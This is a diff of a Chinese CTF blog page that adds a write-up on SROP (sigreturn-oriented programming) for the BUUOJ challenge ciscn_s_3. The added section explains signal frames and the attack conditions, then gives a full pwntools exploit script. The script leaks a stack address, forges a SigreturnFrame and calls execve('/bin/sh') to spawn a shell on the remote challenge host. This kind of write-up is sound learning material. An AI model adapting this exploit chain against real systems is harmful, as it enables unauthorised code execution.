@@ -17,8 +17,6 @@
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
-  <link rel="shortcut icon" href="/favicon.ico" />
-  
   
 <link rel="stylesheet" href="/dist/main.css">
 
@@ -86,7 +84,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">867</span>
+            <span class="post-count">1.4k</span>
         </span>
     </span>
 
@@ -95,7 +93,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">5 min</span>
         </span>
     </span>
 </div>
@@ -179,6 +177,48 @@
 <h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>先介绍SROP</p>
 <h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROP也是栈溢出，但不同ROP的是。</p>
 <p>SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放到栈中。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h3><p><strong>signal机制</strong></p>
+<p>当有中断或异常产生时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存上下文，再跳转到之前注册好的signal handler中进行处理</p>
+<p>待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。</p>
+<ol>
+<li>一个signal frame被添加到栈，这个frame包含了寄存器的值和一些signal信息</li>
+<li>一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn调用</li>
+<li>signal handler 被调用，signal handler的行为取决于收到什么signal</li>
+<li>signal handler执行后，如果程序没有终止，则返回地址用于执行sigreturn调用</li>
+<li>sigreturn利用signal frame恢复所有寄存器以回到之前状态</li>
+<li>程序继续执行</li>
+</ol>
+<p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203411860.png" alt="image-20210214203411860"></p>
+<blockquote>
+<p>我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p>
+<p>其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p>
+</blockquote>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>系统在执行sigreturn系统调用的时候，不会对signal检查。</p>
+<p>由于sigreturn会从用户栈上恢复所有寄存器的值，而用户栈是保存在用户进程地址空间中的，是用户进程可读写的。</p>
+<p>如果攻击者控制栈，也就控制了寄存器的值。</p>
+<p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203929462.png" alt="image-20210214203929462"></p>
+<p><strong>一系列函数</strong></p>
+<p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210215144016291.png" alt="image-20210215144016291"></p>
+<p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p>
+<ul>
+<li><strong>可以通过栈溢出来控制栈的内容</strong></li>
+<li>需要知道相应的地址<ul>
+<li><strong>“/bin/sh”</strong></li>
+<li><strong>Signal Frame</strong></li>
+<li><strong>syscall</strong></li>
+<li><strong>sigreturn</strong></li>
+</ul>
+</li>
+<li>需要有够大的空间来塞下整个 sigal frame</li>
+</ul>
+<p>接下来，看我们这个题</p>
+<p>syscall sigreturn 是我们知道的</p>
+<p>接下来解决bin/sh就可以，由第一种解法我们已经知道栈上指向/bin/sh的指针</p>
+<p>接下来直接写就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29158</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x04005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(vuln_addr)</span><br><span class="line">sl(payload1)</span><br><span class="line">print(r(<span class="number">0x20</span>))</span><br><span class="line">binsh = u64(r(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">leak(<span class="string">"/bin/sh"</span>,binsh)</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line">payload = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(sigreturn) + p64(syscall) + str(sigframe)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>pwntools已经集成了sigreturn</p>
+</blockquote>
  
       <!-- reward -->
       
@@ -266,9 +306,9 @@
       </a>
     
     
-      <a href="/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/" class="article-nav-link">
+      <a href="/2021/01/23/BUU-PWN/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">linux备忘录</div>
+        <div class="article-nav-title">BUU(PWN1)</div>
       </a>
     
   </nav>
@@ -368,8 +408,6 @@
       <li>
         <!-- cnzz统计 -->
         
-        <script type="text/javascript" src='https://v1.cnzz.com/z_stat.php?id=1279682154&amp;web_id=1279682154'></script>
-        
       </li>
     </ul>
   </div>
@@ -389,10 +427,6 @@
       <button class="navbar-toggle"></button>
 <nav class="navbar">
   
-  <div class="logo">
-    <a href="/"><img src="/images/avatar.jpg" alt="pz1o"></a>
-  </div>
-  
   <ul class="nav nav-main">
     
     <li class="nav-item">
@@ -400,7 +434,7 @@
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/archives">Archives</a>
+      <a class="nav-item-link" href="/archives">Archive</a>
     </li>
     
     <li class="nav-item">
